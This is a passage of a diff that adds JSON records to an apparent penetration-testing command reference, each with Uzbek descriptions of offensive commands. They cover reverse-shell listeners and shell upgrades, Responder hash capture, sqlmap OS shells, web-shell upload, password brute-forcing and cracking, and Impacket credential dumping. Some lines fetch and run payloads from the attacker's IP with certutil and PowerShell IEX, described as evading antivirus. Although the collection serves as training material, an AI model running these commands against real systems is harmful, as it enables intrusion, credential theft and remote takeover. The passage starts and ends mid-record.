+      "category": "PrivEsc & Tools",
+      "commandText": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "shortDesc": "Cheklangan terminalni to'liq interaktiv Bash terminaliga aylantirish",
+      "fullDoc": "Reverse shell olgandan so'ng, terminal qulay ishlashi (clear, su buyruqlari ishlashi) uchun ishlatiladi.",
+      "parameters": "[{\"flag\":\"pty.spawn\",\"desc\":\"Pseudo-terminal ochish\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 51,
+      "title": "Socat: Shifrlangan Reverse Shell",
+      "category": "PrivEsc & Tools",
+      "commandText": "socat file:`tty`,raw,echo=0 tcp-listen:4444",
+      "shortDesc": "Netcat'ga qaraganda ancha barqaror va qulay terminal ulanishini eshitish",
+      "fullDoc": "CTRL+C bosilganda o'chib ketmaydigan va o'lchamini moslashtirsa bo'ladigan shell ulanishi.",
+      "parameters": "[{\"flag\":\"tcp-listen:4444\",\"desc\":\"Portni eshitish\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 52,
+      "title": "Chisel: Port Forwarding va Tunnelling",
+      "category": "PrivEsc & Tools",
+      "commandText": "chisel server -p 8000 --reverse",
+      "shortDesc": "Yopiq ichki tarmoqlarga kirish uchun tunnel ochish serveri",
+      "fullDoc": "Nishon tarmoq ichidagi boshqa yopiq kompyuterlarga ulanish (Pivot qilish) uchun ishlatiladi.",
+      "parameters": "[{\"flag\":\"--reverse\",\"desc\":\"Reverse port forwarding yoqish\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 53,
+      "title": "Macchanger: MAC Manzilni O'zgartirish",
+      "category": "PrivEsc & Tools",
+      "commandText": "sudo macchanger -r eth0",
+      "shortDesc": "-r: Tasodifiy (Random) yangi MAC manzil o'rnatish",
+      "fullDoc": "Tarmoq kartangizning haqiqiy apparat IDsini yashirish va blokirovkalarni chetlab o'tish uchun ishlatiladi.",
+      "parameters": "[{\"flag\":\"-r\",\"desc\":\"Random MAC generator\"}]",
+      "createdAt": "2026-08-19 08:23:39"
+    },
+    {
+      "id": 54,
+      "title": "Nmap: Ping Jo'natmasdan Skan Qilish",
+      "category": "Recon & Scan",
+      "commandText": "nmap -Pn -p 80,443 <target>",
+      "shortDesc": "-Pn: Ping bilan tekshirmasdan darhol portlarni skan qilish; -p 80,443: Faqat 80 va 443 portlar",
+      "fullDoc": "Ko'p serverlar firewall (Xavfsizlik devori) orqasida turadi va Ping so'roviga javob bermaydi. Nmap esa kompyuter o'chgan deb o'ylab skan qilmaydi. `-Pn` buyrug'i Nmap'ga 'kompyuter yonik deb hisobla va darhol portlarni tekshir' deydi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `<target>` o'rniga nishon IP yoki sayt yoziladi.\n- Misol: nmap -Pn -p 80,443 192.168.1.50",
+      "parameters": "[{\"flag\":\"-Pn\",\"desc\":\"Ping (ICMP) so'rovini o'chirib qo'yish, firewall'ni aldash uchun\"},{\"flag\":\"-p 80,443\",\"desc\":\"Faqat web portlar bo'lgan 80 (HTTP) va 443 (HTTPS) ni tekshirish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 55,
+      "title": "Nmap: Tezkor (Fast) Skanerlash",
+      "category": "Recon & Scan",
+      "commandText": "nmap -F <target>",
+      "shortDesc": "-F: Fast mode (Barcha 65535 ta emas, faqat eng mashhur 100 ta portni tekshirish)",
+      "fullDoc": "Vaqtingiz kam bo'lganda tezda eng asosiy portlarni tekshirish uchun ishlatiladi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: nmap -F scanme.nmap.org",
+      "parameters": "[{\"flag\":\"-F\",\"desc\":\"Fast scan (Eng ko'p ishlatiladigan Top 100 port)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 56,
+      "title": "Nmap: Natijani Faylga Saqlash",
+      "category": "Recon & Scan",
+      "commandText": "nmap -sC -sV -oN scan_result.txt <target>",
+      "shortDesc": "-oN: Skanerlash natijasini oddiy matn (txt) faylida saqlab berish",
+      "fullDoc": "Skanerlash tugagach, ekrandagi barcha ma'lumot yo'qolib ketmasligi uchun uni faylga saqlaydi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `scan_result.txt` o'rniga xohlagan fayl nomingizni yozing.\n- Misol: nmap -sC -sV -oN nmap_result.txt 10.10.10.10",
+      "parameters": "[{\"flag\":\"-oN\",\"desc\":\"Output Normal (Natijani standart matn fayliga yozish)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 57,
+      "title": "Nmap: Syn Stealth Scan (Yashirin Skan)",
+      "category": "Recon & Scan",
+      "commandText": "sudo nmap -sS <target>",
+      "shortDesc": "-sS: To'liq ulanmasdan (half-open) qilinadigan yashirin skan",
+      "fullDoc": "Standard skanerlashda kompyuter server bilan to'liq bog'lanadi va jurnalga (log) tushadi. SYN skan esa ulanishni yarmida uzib qo'yadi va sezilarsizroq ishlaydi (Sudo ruxsati kerak).\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: sudo nmap -sS 192.168.1.1",
+      "parameters": "[{\"flag\":\"-sS\",\"desc\":\"TCP SYN stealth scan (Yashirin skanerlash)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 58,
+      "title": "Nmap: NSE Vuln Skriptlarini Ishga Tushirish",
+      "category": "Recon & Scan",
+      "commandText": "nmap --script vuln <target>",
+      "shortDesc": "--script vuln: Nmap'ning tayyor zaiflik qidiruvchi avtomatik skriptlar to'plami",
+      "fullDoc": "Nmap nafaqat portni topadi, balki shu portda mashhur xakerlik zaifliklari (CVE) bor-yo'qligini tekshirib beradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: nmap --script vuln 10.10.10.15",
+      "parameters": "[{\"flag\":\"--script vuln\",\"desc\":\"Xavfsizlik teshiklarini (Vulnerabilities) avtomatik aniqlash skripti\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 59,
+      "title": "TCPDump: Tarmoq Trafikini Ushlab Qolish",
+      "category": "Recon & Scan",
+      "commandText": "sudo tcpdump -i eth0 port 80",
+      "shortDesc": "-i eth0: Network karta; port 80: Faqat HTTP web trafikni kuzatish",
+      "fullDoc": "Kompyuteringiz tarmoq kartasidan o'tayotgan har bir ma'lumot paketini (parollar, matnlar) ekranga chiqaradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `eth0` o'rniga o'zingizning internet kartangiz nomini yozasiz (masalan: wlan0).\n- Misol: sudo tcpdump -i wlan0 port 80",
+      "parameters": "[{\"flag\":\"-i eth0\",\"desc\":\"Qaysi tarmoq interfeysini eshitishni ko'rsatish\"},{\"flag\":\"port 80\",\"desc\":\"Faqat 80-port orqali o'tayotgan paketlarni saralab olish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 60,
+      "title": "Netcat: Chat / Port Orqali Matn Uzatish",
+      "category": "Recon & Scan",
+      "commandText": "nc -l -p 1234",
+      "shortDesc": "-l: Eshitish (Listen); -p 1234: 1234-portda ulanish kutish",
+      "fullDoc": "Ikki kompyuter o'rtasida oddiy bog'lanish o'rnatish yoki ma'lumot qabul qilish uchun server vazifasini o'taydi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `1234` o'rniga o'zingiz xohlagan bo'sh port nomerini yozasiz.",
+      "parameters": "[{\"flag\":\"-l\",\"desc\":\"Listen mode (Ulanishlarni eshitish rejasi)\"},{\"flag\":\"-p 1234\",\"desc\":\"Kutilayotgan port raqami\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 61,
+      "title": "Responder: Tarmoqda Parollarni Tutib Olish",
+      "category": "Recon & Scan",
+      "commandText": "sudo responder -I eth0 -dwv",
+      "shortDesc": "-I eth0: Tarmoq kartasi; -dwv: Ish faoliyati va parollarni avto-tutish",
+      "fullDoc": "Windows tarmoqlarida kimdir adashib noto'g'ri papka manzilini yozsa, Responder o'zini o'sha papka qilib ko'rsatib, foydalanuvchining shifrlangan parolini (NTLM hash) o'g'irlaydi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `eth0` o'rniga lokal tarmoq kartangiz ko'rsatiladi.",
+      "parameters": "[{\"flag\":\"-I eth0\",\"desc\":\"Kuzatuv olib boriladigan tarmoq kartasi\"},{\"flag\":\"-dwv\",\"desc\":\"WPAD, Rogue DHCP va verbose rejimlarini yoqish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 62,
+      "title": "Route: Yo'nalishlar Jaddvalini Ko'rish",
+      "category": "Recon & Scan",
+      "commandText": "route -n",
+      "shortDesc": "-n: IP manzillarini matn shakliga o'girmasdan (raqamli) tezkor ko'rsatish",
+      "fullDoc": "Kompyuteringiz qaysi routerlar orqali internetga ulanayotgani va asosiy shlyuz (Default Gateway) IP manzilini ko'rish uchun ishlatiladi.",
+      "parameters": "[{\"flag\":\"-n\",\"desc\":\"Numeric (IP larni tezkor raqam ko'rinishida chiqarish)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 63,
+      "title": "SS / Netstat: Ochilgan Portlar Ro'yxati",
+      "category": "Recon & Scan",
+      "commandText": "ss -tulpn",
+      "shortDesc": "-tulpn: O'z kompyuteringizda hozir qaysi dasturlar qaysi portni egallab turganini ko'rsatish",
+      "fullDoc": "O'zingizning kompyuteringizda orqa fonda qaysi dasturlar (masalan, Python, Apache, SSH) portlarni band qilib turganini ko'rsatadi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Qo'shimcha belgi yozilmaydi, to'g'ridan-to me'da ishga tushiriladi.",
+      "parameters": "[{\"flag\":\"-t\",\"desc\":\"TCP portlar\"},{\"flag\":\"-u\",\"desc\":\"UDP portlar\"},{\"flag\":\"-l\",\"desc\":\"Listening (Eshitilayotgan) portlar\"},{\"flag\":\"-p\",\"desc\":\"Dastur nomini (PID) ko'rsatish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 64,
+      "title": "FFUF: Subdomenlarni Fuzzing Qilish",
+      "category": "Web Pentest",
+      "commandText": "ffuf -u http://<target>/ -H \"Host: FUZZ.<domain>\" -w <wordlist>",
+      "shortDesc": "-H: Header o'zgartirish; FUZZ: So'zlar o'rniga qo'yiladigan kalit",
+      "fullDoc": "Aksariyat yashirin subdomenlar (masalan: dev.target.com, admin.target.com) DNS da emas, faqat server sozlamalarida bo'ladi. FFUF ularni Host sarlavhasi orqali birma-bir sinab topadi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `<target>` - IP adresi.\n- `<domain>` - Sayt domeni.\n- `<wordlist>` - Subdomenlar ro'yxati fayli.\n- Misol: ffuf -u http://10.10.10.10/ -H \"Host: FUZZ.target.com\" -w /usr/share/wordlists/dns.txt",
+      "parameters": "[{\"flag\":\"-H Host: FUZZ...\",\"desc\":\"HTTP Header ichidagi Host qiymatini almashtirish\"},{\"flag\":\"-w\",\"desc\":\"Lug'at fayli yo'li\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 65,
+      "title": "Gobuster: Subdomen Qidiruvi (DNS Mode)",
+      "category": "Web Pentest",
+      "commandText": "gobuster dns -d <domain> -w <wordlist>",
+      "shortDesc": "dns: DNS rejasi; -d: Domen nomi; -w: Subdomenlar lug'ati",
+      "fullDoc": "Domen nomiga tegishli barcha ochiq subdomenlarni DNS so'rovlari orqali tezkor aniqlash.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt",
+      "parameters": "[{\"flag\":\"-d\",\"desc\":\"Asosiy domen nomi\"},{\"flag\":\"-w\",\"desc\":\"Subdomenlar ro'yxati bo'lgan lug'at\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 66,
+      "title": "CURL: Shaxsiy Cookie Bilan So'rov Yuborish",
+      "category": "Web Pentest",
+      "commandText": "curl -b \"session=123456789\" http://<target>/admin",
+      "shortDesc": "-b: Cookie ma'lumotlarini biriktirib jo'natish",
+      "fullDoc": "Saytga login qilgandan keyin beriladigan seans kalitini (Cookie) saqlab qolib, profil yoki admin sahifasiga to'g'ridan-to'g'ri kirish uchun ishlatiladi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `session=123456789` o'rniga brauzerdan olingan haqiqiy cookie yoziladi.",
+      "parameters": "[{\"flag\":\"-b\",\"desc\":\"Cookie parametrini o'rnatish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 67,
+      "title": "CURL: Fayl Yuborish (Upload Exploitation)",
+      "category": "Web Pentest",
+      "commandText": "curl -F \"file=@shell.php\" http://<target>/upload.php",
+      "shortDesc": "-F: Form-data fayl yuklash rejasi; file=@: Yuklanadigan fayl",
+      "fullDoc": "Saytdagi fayl yuklash bo me'limiga (Upload form) terminal orqali avtomatik ravishda PHP yoki boshqa shell fayllarni yuklab ko'rish.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `@shell.php` - Kompyuteringizdagi tayyor shell fayl nomi.",
+      "parameters": "[{\"flag\":\"-F file=@...\",\"desc\":\"HTML forma orqali fayl uzatishni simulyatsiya qilish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 68,
+      "title": "Sqlmap: POST So'rovini Fayldan O'qib SQLi Izlash",
+      "category": "Web Pentest",
+      "commandText": "sqlmap -r request.txt --p parameter_name --dbs",
+      "shortDesc": "-r: Burp Suite'dan saqlab olingan so'rov fayli; -p: Tekshiriladigan parametr",
+      "fullDoc": "Burp Suite dasturida ushlab qolingan so me'rovni faylga saqlab, Sqlmap'ga berilsa, u murakkab formalar va login sahifalarini avtomatik SQL Injection'ga tekshiradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `request.txt` - HTTP request saqlangan fayl.\n- `parameter_name` - Zaif deb gumon qilingan o'zgaruvchi (masalan: username).",
+      "parameters": "[{\"flag\":\"-r\",\"desc\":\"Request HTTP fayli yo'li\"},{\"flag\":\"-p\",\"desc\":\"Maxsus tekshirilishi kerak bo'lgan parametr\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 69,
+      "title": "Sqlmap: OS Shell Olish (Baza orqali kompyuterga kirish)",
+      "category": "Web Pentest",
+      "commandText": "sqlmap -u \"<url>\" --os-shell",
+      "shortDesc": "--os-shell: Agar baza admin huquqida bo'lsa, operatsion tizim terminalini olish",
+      "fullDoc": "SQL Injection zaifligi orqali to'g'ridan-to'g'ri serverning ichki kompyuter terminaliga (cmd/bash) ulanib olish.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: sqlmap -u \"http://target.com/page.php?id=1\" --os-shell",
+      "parameters": "[{\"flag\":\"--os-shell\",\"desc\":\"Server operatsion tizimi buyruqlar satrini chaqirish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 70,
+      "title": "Wpscan: Parol Tanlash (WP Brute-Force)",
+      "category": "Web Pentest",
+      "commandText": "wpscan --url <target> -U admin -P <wordlist>",
+      "shortDesc": "-U: WordPress login; -P: Parollar fayli",
+      "fullDoc": "WordPress admin paneliga ko'rsatilgan foydalanuvchi nomi uchun parollar lug'atini sinab ko'rish.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: wpscan --url http://blog.target.com -U admin -P /usr/share/wordlists/rockyou.txt",
+      "parameters": "[{\"flag\":\"-U admin\",\"desc\":\"WordPress foydalanuvchi logini\"},{\"flag\":\"-P\",\"desc\":\"Parollar to'plami fayli\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 71,
+      "title": "Kiterunner: API Yo'llarini Qidirish (API Enumeration)",
+      "category": "Web Pentest",
+      "commandText": "kr scan http://<target>/api -w /path/to/routes.kite",
+      "shortDesc": "scan: API yo'llarini tekshirish; -w: API uchun maxsus .kite lug'at",
+      "fullDoc": "Zamonaviy saytlardagi yashirin API marshrutlarini (masalan: /api/v1/users, /api/v1/debug) topish uchun ishlatiladi.",
+      "parameters": "[{\"flag\":\"-w\",\"desc\":\"Kiterunner skanerlash lug'ati (.kite formati)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 72,
+      "title": "JWT_Tool: JSON Web Token Xavfsizligini Tekshirish",
+      "category": "Web Pentest",
+      "commandText": "python3 jwt_tool.py <JWT_TOKEN> -X a",
+      "shortDesc": "-X a: Algoritmni 'None' qilib kalit siz signaturalarni buzib ko'rish",
+      "fullDoc": "Saytlarda autentifikatsiya uchun ishlatiladigan JWT Tokenlarni soxtalashtirish yoki buzish uchun ishlatiladi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `<JWT_TOKEN>` o'rniga saytdan olingan uzun token kiritiladi.",
+      "parameters": "[{\"flag\":\"-X a\",\"desc\":\"Algoritm buzish hujumi (None Algorithm Attack)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 73,
+      "title": "Ceyl: Saytdan Maxsus Parollar Lug'atini Yaratish (Cewl)",
+      "category": "Web Pentest",
+      "commandText": "cewl -m 5 -w custom_pass.txt http://<target>",
+      "shortDesc": "-m 5: Kamida 5 belgili so'zlar; -w: Yaratiladigan fayl nomi",
+      "fullDoc": "Saytdagi barcha matnlarni o'qib chiqadi va shu kompaniyaga tegishli bo'lgan maxsus so'zlardan iborat parollar lug'ati tuzib beradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: cewl -m 5 -w company_words.txt http://target.com",
+      "parameters": "[{\"flag\":\"-m 5\",\"desc\":\"Minimal so'z uzunligi (5 ta harf)\"},{\"flag\":\"-w\",\"desc\":\"Lug'at saqlanadigan fayl nomi\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 74,
+      "title": "Hydra: RDP (Remote Desktop) Parol Tanlash",
+      "category": "Exploitation",
+      "commandText": "hydra -l Administrator -P <wordlist> rdp://<target>",
+      "shortDesc": "rdp://: Windows masofaviy ish stoli xizmatiga parol sinash",
+      "fullDoc": "Windows serverlarning RDP (3389 port) xizmatiga parollarni ketma-ket sinab ko'rish.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.20",
+      "parameters": "[{\"flag\":\"-l Administrator\",\"desc\":\"Windows standart admin logini\"},{\"flag\":\"rdp://\",\"desc\":\"Prototiplar protokoli yo me'nalishi\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 75,
+      "title": "Hydra: Web Login Formaga Brute-Force",
+      "category": "Exploitation",
+      "commandText": "hydra -l admin -P <wordlist> <target> http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\"",
+      "shortDesc": "http-post-form: Web formaga POST so'rov yuborib parol tanlash",
+      "fullDoc": "Saytlarning kirish formalariga avtomatik login va parollarni yuborib ko'rish.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `/login.php` - Forma manzili.\n- `F=incorrect` - Parol xato bo'lganda ekranda chiqadigan so'z.",
+      "parameters": "[{\"flag\":\"^USER^\",\"desc\":\"Hydra login qo'yadigan joy\"},{\"flag\":\"^PASS^\",\"desc\":\"Hydra parol qo'yadigan joy\"},{\"flag\":\"F=\",\"desc\":\"Xatolik matni (Failure message)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 76,
+      "title": "Hashcat: NTLMv2 Hash Parolini Ochish",
+      "category": "Exploitation",
+      "commandText": "hashcat -m 5600 ntlm_hashes.txt <wordlist>",
+      "shortDesc": "-m 5600: NTLMv2 shifrlash kodi; <wordlist>: Parollar fayli",
+      "fullDoc": "Responder orqali Windows tarmog'idan tutib olingan NTLMv2 xeshlarini tezkor ochib beradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt",
+      "parameters": "[{\"flag\":\"-m 5600\",\"desc\":\"NTLMv2 hash algoritmi id raqami\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 77,
+      "title": "Hashcat: ZIP Arxiv Parolini Ochish",
+      "category": "Exploitation",
+      "commandText": "hashcat -m 13600 zip_hash.txt <wordlist>",
+      "shortDesc": "-m 13600: WinZip yoki ZIP arxiv shifrlash turi",
+      "fullDoc": "Parol qo'yilgan ZIP fayllarning xeshini olgandan so'ng, uning parolini videokarta orqali ochadi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `zip_hash.txt` - zip2john orqali olingan xesh fayli.",
+      "parameters": "[{\"flag\":\"-m 13600\",\"desc\":\"WinZip hash rejasi\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 78,
+      "title": "Zip2john: ZIP Fayldan Xesh Olish",
+      "category": "Exploitation",
+      "commandText": "zip2john protected.zip > zip_hash.txt",
+      "shortDesc": "ZIP fayl parolini buzish uchun uning xeshini ajratib faylga yozish",
+      "fullDoc": "John the Ripper yoki Hashcat dasturlari tushunadigan shaklda ZIP fayldan parollar xeshini sug'urib oladi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `protected.zip` - Parolli arxiv fayli.",
+      "parameters": "[{\"flag\":\">\",\"desc\":\"Chiqgan natijani faylga saqlash belgisi\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 79,
+      "title": "Ssh2john: SSH Kalitidan (id_rsa) Xesh Olish",
+      "category": "Exploitation",
+      "commandText": "ssh2john id_rsa > ssh_hash.txt",
+      "shortDesc": "Parol bilan himoyalangan SSH id_rsa maxfiy kalitidan xesh yaratish",
+      "fullDoc": "Agar SSH id_rsa kalitida passphrase (parol) bo'lsa, uni buzish uchun avval xesh ko'rinishiga o'tkazadi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `id_rsa` - SSH private key fayli.",
+      "parameters": "[{\"flag\":\"id_rsa\",\"desc\":\"SSH maxfiy kalit fayli yo'li\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 80,
+      "title": "Metasploit: Multi Handler (Listener Yaratish)",
+      "category": "Exploitation",
+      "commandText": "msfconsole -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <your_ip>; set LPORT 4444; run\"",
+      "shortDesc": "Msfvenom fayllari ulanishi uchun tayyor ulanish eshituvchi rejimini bir chiziqda yoqish",
+      "fullDoc": "Metasploit konsoliga kirmasdan, to'g'ridan-to'g'ri bir buyruq bilan virusli fayllardan keladigan ulanishni kutish rejimini yurgazadi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `<your_ip>` - O'zingizning IP manzilingiz.",
+      "parameters": "[{\"flag\":\"exploit/multi/handler\",\"desc\":\"Avariyali ulanishlarni ushlovchi modul\"},{\"flag\":\"LHOST\",\"desc\":\"Eshitilayotgan IP adresi\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 81,
+      "title": "Impacket: psexec (Windows Serverga To'liq Kirish)",
+      "category": "Exploitation",
+      "commandText": "impacket-psexec domain/username:'password'@<target_ip>",
+      "shortDesc": "Login va parol orqali Windows tizimiga NT AUTHORITY\\SYSTEM (Admin) bo'lib kirish",
+      "fullDoc": "Windows tizimlarida login va parol mavjud bo'lganda, masofadan turib eng yuqori admin huquqida Terminal (CMD) olish.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: impacket-psexec administrator:'P@ssw0rd123'@192.168.1.10",
+      "parameters": "[{\"flag\":\"domain/\",\"desc\":\"Domen nomi (bo'sh qoldirilsa lokal foydalanuvchi)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 82,
+      "title": "Impacket: wmiexec (Sezilarsiz Windows Terminal)",
+      "category": "Exploitation",
+      "commandText": "impacket-wmiexec username:'password'@<target_ip>",
+      "shortDesc": "WMI protokoli orqali antiviruslarga sezilmasdan Windows'ga ulanish",
+      "fullDoc": "PsExec'ga qaraganda antiviruslar tomonidan kamroq bloklanadigan masofaviy boshqaruv usuli.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: impacket-wmiexec admin:'123456'@10.10.10.20",
+      "parameters": "[{\"flag\":\"wmiexec\",\"desc\":\"Windows Management Instrumentation buyruq bering vositasi\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 83,
+      "title": "Impacket: SecretDump (Parol Hashlarini Ommaviy Olish)",
+      "category": "Exploitation",
+      "commandText": "impacket-secretsdump domain/username:'password'@<target_ip>",
+      "shortDesc": "Windows SAM va NTDS.dit bazasidan barcha foydalanuvchilar parollarini o'g'irlash",
+      "fullDoc": "Serverga kirgach, undagi barcha foydalanuvchi va adminlarning shifrlangan parollarini bir zumda sug'urib oladi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: impacket-secretsdump administrator:'Pass123'@192.168.1.5",
+      "parameters": "[{\"flag\":\"secretsdump\",\"desc\":\"SAM va LSA xotirasidagi parollarni dump qilish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 84,
+      "title": "WinPEAS: Windows Avto-PrivEsc Skriptini Ishga Tushirish",
+      "category": "PrivEsc & Tools",
+      "commandText": "winpeas.exe > output.txt",
+      "shortDesc": "Windows ichida admin huquqini olish yo'llarini avtomatik tahlil qilish",
+      "fullDoc": "Windows kompyuteriga kirganingizdan so'ng ushbu faylni ishga tushirsangiz, u tizimdagi barcha xatoliklar va admin bo'lish yo'llarini topib beradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Nishon Windows kompyuterida CMD ichida yurgaziladi.",
+      "parameters": "[{\"flag\":\"> output.txt\",\"desc\":\"Natijani tahlil qilish uchun faylga yozish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 85,
+      "title": "Linux: Capability Ruxsatlarini Tekshirish",
+      "category": "PrivEsc & Tools",
+      "commandText": "getcap -r / 2>/dev/null",
+      "shortDesc": "Linux'da SUID bo'lmagan, lekin maxsus vakolati (Capabilities) bor fayllarni topish",
+      "fullDoc": "Ba'zi dasturlarga ildiz (root) huquqisiz ham maxsus imkoniyatlar berilgan bo'ladi. Bu buyruq orqali root bo'lish imkoniyati tekshiriladi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `2>/dev/null` - Xatolik va ruxsat berilmagan xabarlarni yashiradi.",
+      "parameters": "[{\"flag\":\"getcap -r /\",\"desc\":\"Butun ildiz (root) papkasidan imkoniyatlarni izlash\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 86,
+      "title": "Linux: Cron Jobs (Avto-vazifalarni) Ko'rish",
+      "category": "PrivEsc & Tools",
+      "commandText": "cat /etc/crontab",
+      "shortDesc": "Linux'da orqa fonda taymer bo'yicha ishlayotgan root fayllarni ko'rish",
+      "fullDoc": "Agar biror taymerli fayl root huquqida ishlayotgan bo'lsa va unga yozish ruxsatingiz bo'lsa, uni o'zgartirib root bo'lishingiz mumkin.\n\nQAYSI JOYGA NIMA YOZILADI:\n- To'g'ridan-to me'da Linux terminalida bajariladi.",
+      "parameters": "[{\"flag\":\"/etc/crontab\",\"desc\":\"Tizim taymer jadvali fayli yo'li\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 87,
+      "title": "Linux: Writable Files (Yozish Ruxsati Bor Fayllar)",
+      "category": "PrivEsc & Tools",
+      "commandText": "find / -writable -type f 2>/dev/null",
+      "shortDesc": "Oddiy foydalanuvchi o'zgartira oladigan barcha tizim fayllarini topish",
+      "fullDoc": "Siz o'zgartira oladigan muhim tizim fayllari orqali root darajasiga ko'tarilish imkonini beradi.",
+      "parameters": "[{\"flag\":\"-writable\",\"desc\":\"Yozish (Write) ruxsati bor fayllar\"},{\"flag\":\"-type f\",\"desc\":\"Faqat fayllarni saralash (papkalar emas)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 88,
+      "title": "Certutil: Windows Terminalida Fayl Yuklab Olish",
+      "category": "PrivEsc & Tools",
+      "commandText": "certutil -urlcache -split -f http://<your_ip>/file.exe file.exe",
+      "shortDesc": "Windows CMD orqali internetdan yoki hujumchi kompyuteridan fayl ko'chirish",
+      "fullDoc": "Windows'da Wget yoki Curl bo'lmaganda, sertifikatlar utilitasi orqali fayllarni yuklab olish trick'i.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `<your_ip>` - Kali Linux IP manzilingiz.",
+      "parameters": "[{\"flag\":\"-urlcache -split -f\",\"desc\":\"Keshni aylanib o'tib faylni majburiy yuklash\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 89,
+      "title": "PowerShell: Fayl Yuklab Olish (DownloadString)",
+      "category": "PrivEsc & Tools",
+      "commandText": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<your_ip>/script.ps1')\"",
+      "shortDesc": "PowerShell skriptini xotiraga yuklab darhol ishga tushirish (Faylsiz)",
+      "fullDoc": "Skriptni diskka saqlamasdan, to'g'ridan-to'g'ri operativ xotirada (RAM) ishga tushiradi, bu antiviruslarni aldashga yordam beradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `<your_ip>` - Kali Linux IP manzilingiz.",
+      "parameters": "[{\"flag\":\"IEX\",\"desc\":\"Invoke-Expression (Yuklangan kodni darhol yurgazish)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 90,
+      "title": "Chisel: Client Rejasi (Reverse Tunnel)",
+      "category": "PrivEsc & Tools",
